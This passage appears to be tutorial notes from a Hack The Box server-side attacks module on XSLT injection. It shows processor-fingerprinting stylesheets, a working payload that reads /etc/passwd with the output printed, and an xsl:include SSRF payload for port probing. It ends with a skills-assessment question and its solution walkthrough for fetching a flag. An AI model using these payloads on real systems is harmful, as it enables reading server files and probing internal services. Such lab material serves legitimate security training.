    <title>Hide your heart</title>
    <artist>Bonnie Tyler</artist>
    <country>UK</country>
    <company>CBS Records</company>
    <price>9.90</price>
    <year>1988</year>
  </cd>
  <cd>
    <title>Greatest Hits</title>
    <artist>Dolly Parton</artist>
    <country>USA</country>
    <company>RCA</company>
    <price>9.90</price>
    <year>1982</year>
  </cd>
  <cd>
    <title>Still got the blues</title>
    <artist>Gary Moore</artist>
    <country>UK</country>
    <company>Virgin records</company>
    <price>10.20</price>
    <year>1990</year>
  </cd>
  <cd>
    <title>Eros</title>
    <artist>Eros Ramazzotti</artist>
    <country>EU</country>
    <company>BMG</company>
    <price>9.90</price>
    <year>1997</year>
  </cd>
  <cd>
    <title>One night only</title>
    <artist>Bee Gees</artist>
    <country>UK</country>
    <company>Polydor</company>
    <price>10.90</price>
    <year>1998</year>
  </cd>
  <cd>
    <title>Sylvias Mother</title>
    <artist>Dr.Hook</artist>
    <country>UK</country>
    <company>CBS</company>
    <price>8.10</price>
    <year>1973</year>
  </cd>
  <cd>
    <title>Maggie May</title>
    <artist>Rod Stewart</artist>
    <country>UK</country>
    <company>Pickwick</company>
    <price>8.50</price>
    <year>1990</year>
  </cd>
  <cd>
    <title>Romanza</title>
    <artist>Andrea Bocelli</artist>
    <country>EU</country>
    <company>Polydor</company>
    <price>10.80</price>
    <year>1996</year>
  </cd>
  <cd>
    <title>When a man loves a woman</title>
    <artist>Percy Sledge</artist>
    <country>USA</country>
    <company>Atlantic</company>
    <price>8.70</price>
    <year>1987</year>
  </cd>
  <cd>
    <title>Black angel</title>
    <artist>Savage Rose</artist>
    <country>EU</country>
    <company>Mega</company>
    <price>10.90</price>
    <year>1995</year>
  </cd>
  <cd>
    <title>1999 Grammy Nominees</title>
    <artist>Many</artist>
    <country>USA</country>
    <company>Grammy</company>
    <price>10.20</price>
    <year>1999</year>
  </cd>
  <cd>
    <title>For the good times</title>
    <artist>Kenny Rogers</artist>
    <country>UK</country>
    <company>Mucik Master</company>
    <price>8.70</price>
    <year>1995</year>
  </cd>
  <cd>
    <title>Big Willie style</title>
    <artist>Will Smith</artist>
    <country>USA</country>
    <company>Columbia</company>
    <price>9.90</price>
    <year>1997</year>
  </cd>
  <cd>
    <title>Tupelo Honey</title>
    <artist>Van Morrison</artist>
    <country>UK</country>
    <company>Polydor</company>
    <price>8.20</price>
    <year>1971</year>
  </cd>
  <cd>
    <title>Soulsville</title>
    <artist>Jorn Hoel</artist>
    <country>Norway</country>
    <company>WEA</company>
    <price>7.90</price>
    <year>1996</year>
  </cd>
  <cd>
    <title>The very best of</title>
    <artist>Cat Stevens</artist>
    <country>UK</country>
    <company>Island</company>
    <price>8.90</price>
    <year>1990</year>
  </cd>
  <cd>
    <title>Stop</title>
    <artist>Sam Brown</artist>
    <country>UK</country>
    <company>A and M</company>
    <price>8.90</price>
    <year>1988</year>
  </cd>
  <cd>
    <title>Bridge of Spies</title>
    <artist>T`Pau</artist>
    <country>UK</country>
    <company>Siren</company>
    <price>7.90</price>
    <year>1987</year>
  </cd>
  <cd>
    <title>Private Dancer</title>
    <artist>Tina Turner</artist>
    <country>UK</country>
    <company>Capitol</company>
    <price>8.90</price>
    <year>1983</year>
  </cd>
  <cd>
    <title>Midt om natten</title>
    <artist>Kim Larsen</artist>
    <country>EU</country>
    <company>Medley</company>
    <price>7.80</price>
    <year>1983</year>
  </cd>
  <cd>
    <title>Pavarotti Gala Concert</title>
    <artist>Luciano Pavarotti</artist>
    <country>UK</country>
    <company>DECCA</company>
    <price>9.90</price>
    <year>1991</year>
  </cd>
  <cd>
    <title>The dock of the bay</title>
    <artist>Otis Redding</artist>
    <country>USA</country>
    <company>Stax Records</company>
    <price>7.90</price>
    <year>1968</year>
  </cd>
  <cd>
    <title>Picture book</title>
    <artist>Simply Red</artist>
    <country>EU</country>
    <company>Elektra</company>
    <price>7.20</price>
    <year>1985</year>
  </cd>
  <cd>
    <title>Red</title>
    <artist>The Communards</artist>
    <country>UK</country>
    <company>London</company>
    <price>7.80</price>
    <year>1987</year>
  </cd>
  <cd>
    <title>Unchain my heart</title>
    <artist>Joe Cocker</artist>
    <country>USA</country>
    <company>EMI</company>
    <price>8.20</price>
    <year>1987</year>
  </cd>
</catalog>
```

**transformation.xsl**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
  <html>
  <body>
    <h2>My CD Collection</h2>
    <table border="1">
      <tr bgcolor="#9acd32">
        <th>Title</th>
        <th>Artist</th>
      </tr>
      <tr>
        <td><xsl:value-of select="catalog/cd/title"/></td>
        <td><xsl:value-of select="catalog/cd/artist"/></td>
      </tr>
    </table>
  </body>
  </html>
</xsl:template>
</xsl:stylesheet>
```
We need to understand the XSLT format to see how the transformation works.
* The first line is usually the XML version and encoding
* Next, it will have the XSL root node `xsl:stylesheet`
* Then, we will have the directives in `xsl:template match="<PATH>"`. In this case, it will apply to any XML node.
* After that, the transformation is defined for any item in the XML structure matching the previous line.
* To select certain items from the XML document, XPATH language is used in the form of `<xsl:value-of select="<NODE>/<SUBNODE>/<VALUE>"/>`.

To see the results, we will use the command line parser. This can be done as follows:

**Transformation through the terminal**
```
user@htb[/htb]$ saxonb-xslt -xsl:transformation.xsl catalogue.xml

Warning: at xsl:stylesheet on line 3 column 50 of transformation.xslt:
  Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<html>
   <body>
      <h2>My CD Collection</h2>
      <table border="1">
         <tr bgcolor="#9acd32">
            <th>Title</th>
            <th>Artist</th>
         </tr>
         <tr>
            <td>Empire Burlesque</td>
            <td>Bob Dylan</td>
         </tr>
      </table>
   </body>
</html>
```

The following file can be used to detect the underlying preprocessor:

**detection.xsl**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="html"/>
<xsl:template match="/">
    <h2>XSLT identification</h2>
    <b>Version:</b> <xsl:value-of select="system-property('xsl:version')"/><br/>
    <b>Vendor:</b> <xsl:value-of select="system-property('xsl:vendor')" /><br/>
    <b>Vendor URL:</b><xsl:value-of select="system-property('xsl:vendor-url')" /><br/>
</xsl:template>
</xsl:stylesheet>
```
Let us now run the previous command, but this time, using the detection.xsl file:

**Transformation through the terminal**
```
user@htb[/htb]$ saxonb-xslt -xsl:detection.xsl catalogue.xml

Warning: at xsl:stylesheet on line 2 column 80 of detection.xsl:
  Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<h2>XSLT identification</h2><b>Version:</b>2.0<br><b>Vendor:</b>SAXON 9.1.0.8 from Saxonica<br><b>Vendor URL:</b>http://www.saxonica.com/<br>
```
Based on the preprocessor, we can go to the XSLT documentation for this version to identify functions of interest, such as the below:
* `unparsed-text` can be used to read local files.

**readfile.xsl**
```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:template match="/">
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/>
</xsl:template>
</xsl:stylesheet>
```

**Transformation through the terminal**
```
user@htb[/htb]$ saxonb-xslt -xsl:readfile.xsl catalogue.xml

Warning: at xsl:stylesheet on line 1 column 111 of readfile.xsl:
  Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<?xml version="1.0" encoding="UTF-8"?>root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
<SNIP>
```

* `xsl:include` can be used to perform SSRF

We can also mount SSRF attacks if we have control over the transformation:

**ssrf.xsl**
```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:include href="http://127.0.0.1:5000/xslt"/>
<xsl:template match="/">
</xsl:template>
</xsl:stylesheet>
```

**Transformation through the terminal**
```
user@htb[/htb]$ saxonb-xslt -xsl:ssrf.xsl catalogue.xml

Warning: at xsl:stylesheet on line 1 column 111 of ssrf.xsl:
  Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
Error at xsl:include on line 2 column 49 of ssrf.xsl:
  XTSE0165: java.io.FileNotFoundException: http://127.0.0.1:5000/xslt
Failed to compile stylesheet. 1 error detected.
```

```
D3vil0per@htb[/htb]$ saxonb-xslt -xsl:ssrf.xsl catalogue.xml

Warning: at xsl:stylesheet on line 1 column 111 of ssrf.xsl:
  Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
Error at xsl:include on line 2 column 49 of ssrf.xsl:
  XTSE0165: java.net.ConnectException: Connection refused (Connection refused)
Failed to compile stylesheet. 1 error detected.
```

Check the different responses above when we hit an open or closed port. If you want to try this yourself in Pwnbox or a local machine, try executing the `saxonb-xslt` command above one time with nothing listening on port 5000 and one time with an HTTP server listening on port 5000 (`sudo python3 -m http.server 5000` in a separate tab or terminal).

We presented some tech-stack-identification XSL files at the beginning of this section. Below is one more, larger than the previous ones. Try using it to reproduce the example above:

**fingerprinting.xsl**
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
 Version: <xsl:value-of select="system-property('xsl:version')" /><br />
 Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br />
 Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br />
 <xsl:if test="system-property('xsl:product-name')">
 Product Name: <xsl:value-of select="system-property('xsl:product-name')" /><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:product-version')">
 Product Version: <xsl:value-of select="system-property('xsl:product-version')" /><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:is-schema-aware')">
 Is Schema Aware ?: <xsl:value-of select="system-property('xsl:is-schema-aware')" /><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:supports-serialization')">
 Supports Serialization: <xsl:value-of select="system-property('xsl:supportsserialization')"
/><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:supports-backwards-compatibility')">
 Supports Backwards Compatibility: <xsl:value-of select="system-property('xsl:supportsbackwards-compatibility')"
/><br />
 </xsl:if>
</xsl:template>
</xsl:stylesheet>
```

**Transformation through the terminal**
```
user@htb[/htb]$ saxonb-xslt -xsl:fingerprinting.xsl catalogue.xml

Warning: at xsl:stylesheet on line 2 column 80 of fingerprinting.xsl:
  Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<?xml version="1.0" encoding="UTF-8"?>
 Version: 2.0<br/>
 Vendor: SAXON 9.1.0.8 from Saxonica<br/>
 Vendor URL: http://www.saxonica.com/<br/>
 Product Name: SAXON<br/>
 Product Version: 9.1.0.8<br/>
 Is Schema Aware ?: no<br/>
 Supports Serialization: <br/>
 Supports Backwards Compatibility: <br/>
```
We can also use the following [wordlist](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xslt.txt) for brute-forcing functionality available in target applications.

# Skills Assessment

## Server-Side Attacks - Skills Assessment

You are currently participating in a bug bounty program. The company participating in the program is most interested in critical flaws such as injection flaws, logic flaws, and server-side attacks. Server-side attacks are the most desirable and lucrative bug listed in this particular program.

Start by performing all required footprinting activities to obtain as much information as possible regarding the target's tech stack. Then, mount any applicable server-side attack(s) against the target and answer the questions below to complete the skills assessment and finish this module.

Question: Read the content of 'flag.txt' through a server-side attack and submit its content as your answer. Bonus points if you do this without registering an account!!! Answer format: HTB{String}

Solution: Just open Burpsuite, try to login with random credentials, then on HTTP History of Burp you should get some jquery requests. Inside `static/jquery.js` file there are different base64 strings. Decode the last of them, that is an URL path, and visit it. From there, use the `file://` schema to read file inside the server or use directly the `http://` schema to read the `flag.txt` since it is in the root folder of the web application. Before paste that flag on HTB, paste it on Notepad and delete any final space.
